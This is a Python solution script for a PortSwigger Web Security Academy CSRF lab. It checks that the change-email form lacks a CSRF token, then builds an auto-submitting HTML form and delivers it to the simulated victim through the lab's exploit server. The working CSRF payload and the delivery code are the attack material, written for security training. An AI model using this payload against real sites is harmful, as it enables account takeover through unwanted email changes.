# Lab: CSRF vulnerability with no defenses
# Idea: the change-email request has only the session cookie + email (no csrf token),
#       so a page on ANOTHER site (exploit server) can make the victim's browser send it.
# Note: requests does not run JS. Python only uploads the HTML to the exploit server
#       and presses "Deliver". The victim's (PortSwigger bot's) Chrome actually runs it.

import requests

base = "https://0afb007a04128e5180a74422003f0012.web-security-academy.net"
exploit = "https://exploit-0add00b8041d8e99808c43d001cb00db.exploit-server.net"   # "Go to exploit server" URL
NEW_EMAIL = "pwned456@test.com"   # must be an email NOT used by any account yet

# ------------------------------------------------------------------
# (Optional) step1~3: just checking the request as wiener in Burp-style.
# Not needed to solve: CSRF never uses the attacker's own session.
# ------------------------------------------------------------------
login_session = requests.Session()

print("===========[step1] login with provided Credential===============")
page_login = login_session.post(f"{base}/login", data={"username": "wiener", "password": "peter"})
print("status:", page_login.status_code)

print("===========[step2] Access to Login Account's page===============")
page_account = login_session.get(f"{base}/my-account", params={"id": "wiener"}, allow_redirects=False)
print("csrf token in form?:", 'name="csrf"' in page_account.text)   # False -> no token = CSRF possible

print("===========[step3] Try Change e-mail===============")
# FIX: params= -> data=  (POST body, same as Burp: email=...)
page_change_email = login_session.post(f"{base}/my-account/change-email",
                                       data={"email": "mine789@test.com"}, allow_redirects=False)
print("status:", page_change_email.status_code)   # 302 = changed with cookie only

# ------------------------------------------------------------------
# step4: build the CSRF HTML (same as what you typed in the Body box)
# ------------------------------------------------------------------
print("===========[step4] Build CSRF HTML===============")
body = f"""<form method="POST" action="{base}/my-account/change-email">
    <input type="hidden" name="email" value="{NEW_EMAIL}">
</form>
<script>
document.forms[0].submit();
</script>"""
print(body)

# ------------------------------------------------------------------
# step5: upload to exploit server and deliver to victim
# The exploit server page is also just a form -> check its field names in Burp
# (POST / with urlIsHttps, responseFile, responseHead, responseBody, formAction)
# ------------------------------------------------------------------
print("===========[step5] Store + Deliver exploit to victim===============")
form = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
    "responseBody": body,
}
r = requests.post(exploit + "/", data={**form, "formAction": "STORE"})
print("store status:", r.status_code)
r = requests.post(exploit + "/", data={**form, "formAction": "DELIVER_TO_VICTIM"})
print("deliver status:", r.status_code)

print("===========[step6] Check lab status===============")
r = requests.get(base)
print("solved?:", "is-solved" in r.text)
